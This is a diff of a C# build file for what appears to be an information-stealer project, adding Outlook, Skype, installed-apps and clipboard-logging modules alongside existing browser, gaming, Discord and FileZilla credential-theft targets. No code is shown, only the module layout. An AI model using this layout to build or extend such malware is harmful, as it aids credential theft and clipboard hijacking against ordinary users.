@@ -71,6 +71,7 @@
   <ItemGroup>
     <Compile Include="Config.cs" />
     <Compile Include="Modules\Clipper\Clipboard.cs" />
+    <Compile Include="Modules\Clipper\ClipLogger.cs" />
     <Compile Include="Modules\Clipper\Clipper.cs" />
     <Compile Include="Modules\Clipper\EventManager.cs" />
     <Compile Include="Modules\Clipper\Patterns.cs" />
@@ -123,12 +124,15 @@
     <Compile Include="Modules\Passwords\Targets\Browsers\Firefox\Logins.cs" />
     <Compile Include="Modules\Passwords\Targets\Gaming\Minecraft.cs" />
     <Compile Include="Modules\Passwords\Targets\Gaming\Uplay.cs" />
+    <Compile Include="Modules\Passwords\Targets\Messengers\Outlook.cs" />
     <Compile Include="Modules\Passwords\Targets\Messengers\Pidgin.cs" />
+    <Compile Include="Modules\Passwords\Targets\Messengers\Skype.cs" />
     <Compile Include="Modules\Passwords\Targets\System\ActiveWindows.cs" />
     <Compile Include="Modules\Passwords\Targets\System\DirectoryTree.cs" />
     <Compile Include="Modules\Passwords\Targets\Messengers\Discord.cs" />
     <Compile Include="Modules\Passwords\Targets\FileZilla.cs" />
     <Compile Include="Modules\Passwords\Targets\System\FileGrabber.cs" />
+    <Compile Include="Modules\Passwords\Targets\System\InstalledApps.cs" />
     <Compile Include="Modules\Passwords\Targets\System\ProcessList.cs" />
     <Compile Include="Modules\Passwords\Targets\System\ProductKey.cs" />
     <Compile Include="Modules\Passwords\Targets\System\DesktopScreenshot.cs" />
@@ -149,7 +153,6 @@
     <None Include="App.config" />
     <None Include="packages.config" />
   </ItemGroup>
-  <ItemGroup />
   <ItemGroup>
     <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
       <Visible>False</Visible>
